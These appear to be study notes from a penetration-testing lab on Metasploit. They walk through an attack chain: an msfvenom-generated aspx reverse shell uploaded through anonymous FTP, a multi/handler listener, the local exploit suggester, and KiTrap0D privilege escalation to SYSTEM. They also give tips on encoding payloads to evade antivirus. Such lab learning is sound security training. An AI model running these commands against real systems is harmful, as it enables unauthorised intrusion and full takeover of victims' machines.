### MSFVenom Basics

- **MSFVenom**: Combines MSFPayload & MSFEncode for generating customizable payloads.
- **Use**: Create shellcode, clean it, and encode to avoid errors or detection.
- Modern AVs use heuristic analysis, making evasion harder.

### Generating Payloads

1. **FTP Exploit Scenario**:
    
    - Open FTP (port 21), anonymous login enabled.
    - Files in FTP root accessible via web `/uploads` directory.
    - Upload `.aspx` reverse shell.
2. **Generate Payload**:
    
```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
    ```
    
3. **Trigger Payload**:
    
    - Upload `reverse_shell.aspx` via FTP.
    - Access: `http://10.10.10.5/reverse_shell.aspx`.

---

### Multi/Handler Listener

- **Setup Listener**:
    
    ```bash
    msfconsole
    use multi/handler
    set LHOST 10.10.14.5
    set LPORT 1337
    run
    ```
    
- Reverse TCP connection received upon triggering the payload.

---

### Local Exploit Suggester

- **Purpose**: Find privilege escalation options post-exploitation.
- **Usage**:
    
    ```bash
    search local exploit suggester
    use post/multi/recon/local_exploit_suggester
    set SESSION 2
    run
    ```
    
- Example Results:
    - `bypassuac_eventvwr`: Requires admin group.
    - `ms10_015_kitrap0d`: Exploitable for SYSTEM privileges.

---

### Privilege Escalation: KiTrap0D

1. **Search & Use Exploit**:
    
    ```bash
    search kitrap0d
    use exploit/windows/local/ms10_015_kitrap0d
    set SESSION 3
    set LPORT 1338
    run
    ```
    
2. **Outcome**:
    
    - Exploits Windows kernel for SYSTEM privileges.
    - Meterpreter session under `NT AUTHORITY\SYSTEM`.

### Tips

- For unstable sessions, try encoding payloads.
- Avoid HTML in payloads to keep web responses blank.